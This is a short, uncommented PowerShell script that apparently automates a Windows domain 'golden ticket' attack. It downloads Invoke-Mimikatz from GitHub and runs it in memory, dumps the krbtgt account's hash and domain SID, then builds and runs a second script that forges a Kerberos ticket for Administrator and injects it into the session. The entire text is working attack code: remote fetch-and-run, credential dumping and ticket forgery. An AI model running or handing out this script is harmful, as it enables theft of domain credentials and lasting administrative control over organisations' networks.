IEX ([System.Text.Encoding]::UTF8.GetString((New-Object system.net.WebClient).DownloadData("https://raw.githubusercontent.com/phra/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1")))

$(
	Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"'
) *>&1 > output.txt

$tdomain = Get-Content .\output.txt | findstr Domain | %{ $_.Split(' ')[2] ; }
$tdomain = $tdomain + '.local'
$sid = Get-Content .\output.txt | findstr Domain | %{ $_.Split(' ')[4] ; }
$ntlm = Get-Content .\output.txt | findstr NTLM|Select-Object -first 1 | %{ $_.Split(':')[1] ; } | %{ $_.Split(' ')[1] ; }

$write = "Invoke-Mimikatz -Command `'`"kerberos::golden /domain:$tdomain /sid:$sid /rc4:$ntlm /user:Administrator /id:500 /ptt`"`' "
$(
	echo $write
) *>&1 > temp_mem.ps1

.\temp_mem.ps1
